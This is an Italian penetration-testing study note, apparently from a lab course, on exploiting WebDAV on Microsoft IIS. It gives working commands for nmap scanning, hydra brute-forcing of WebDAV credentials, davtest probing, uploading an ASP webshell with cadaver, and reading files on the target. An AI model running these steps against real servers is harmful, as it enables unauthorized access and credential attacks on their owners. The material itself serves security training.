**IIS** (Internet Information Services) è un software pubblicato da Microsoft che **trasforma** il **computer** su cui è in esecuzione in un **server web**. Può **ospitare siti web** o altri **file** o **gestire** **l'accesso** ai **file su altri serve**r ed essere **accessibile** dal **web** **o** solo su una **rete locale**.

- Sviluppato in **PHP** e **ASP.NET**
- Configurato solitamente nella porta **80** o **443**
- **Estensioni** di file eseguibili supportate
    - .asp
    - .aspx
    - .config
    - .php

# WebDAV

**WebDAV** (Web-based Distributed Authoring and Versioning) è un insieme di **estensioni** del **protocollo HTTP** che **consentono** agli utenti di **modificare** in modo collaborativo i **file** e gestire file su **server Web remoti.**

**WebDAV permette** essenzialmente **a** un **server** **web** di **funzionare come** un **file** server per l'authoring collaborativo

- WebDAV viene eseguito su **Microsoft IIS** sulle porte **80/443**
- Per connettersi a un server **WebDAV**, è **necessario** fornire **credenziali** legittime.

# WebDAV Exploitation

1. **identificare** se **WebDAV** è stato **configurato** per funzionare **sul server Web IIS.**
2. Eseguire un **attacco** di **brute force** sul **server** **WebDAV** al fine di
identificare le credenziali legittime da utilizzare per l'autenticazione.
3. inseriamo autenticazioni sul server WebDAV e **caricare** un **payload .asp** dannoso che può essere utilizzato **eseguire comandi** arbitrari o ottenere una **reverse shell** sull'obiettivo

### Tools

- **davtest** - Utilizzato per **scansionare**, **autenticare** e **sfruttare** un server WebDAV. Lo fa creando cartelle, file con diverse estensioni all’interno dell’IP_TARGET
- **cadaver** - supporta il **caricamento** e il **download** di **file**, la **visualizzazione** su schermo, la **modifica**, le operazioni sugli spazi dei nomi (spostamenti/copia), la creazione di collezioni e la **creazione** di file. **cancellazione**, **manipolazione** delle proprietà e **blocco** delle **risorse** su server WebDAV.

### Pratica

1. **nmap -T4 -sS -A -vvv -p- -Pn --version-intensity 8 --osscan-guess IP_TARGET**
2. **nmap -sV -p 80 --script=http-enum IP_TARGET** enumerazione directory (vediamo che abbiamo /webdav/ e su firefox ci chiede credenziali)
3. **hydra -L hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt IP_TARGET http-get /webdav/**  trovare credenziali di pagina webdav ****

OTTENUTI GLI ACCESSI POSSIAMO UTILIZZARE I TOOLS PER MANIPOLARE I FILE

1. **davtest -auth UTENTE:PASSWORD -url http://IP_TARGET/webdav** attiva il tool, e ci dirà quali estensioni possiamo caricare e quali possiamo eseguire. Se **EXEC asp** è **on** possiamo utilizzare un **Payload**

ORA CHE SAPPIAMO QUALI FILE CARICARE ED ESEGUIRE SUL TARGET UTILIZZIAMO **cadaver**

1. **cadaver http://IP_TARGET/webdav** inserire credenziali della directory wevdav
2. **put /usr/share/webshells/asp/webshell.asp** installa una webshell

ORA ABBIAMO UNA SHELL CON UNA GUI SUL SITO TARGET, BASTA ACCEDERE ALLA DIRECTORY webdav TRAMITE FIREFOX E TROVEREMO LA  DIRECTORY DELLA SHELL CARICATA

### Alcuni comandi:

- **whoami**
- **ipconfig**
- **shell**
- **dir C:\**
- **type C:\NOME_FILE_DA_LEGGERE**
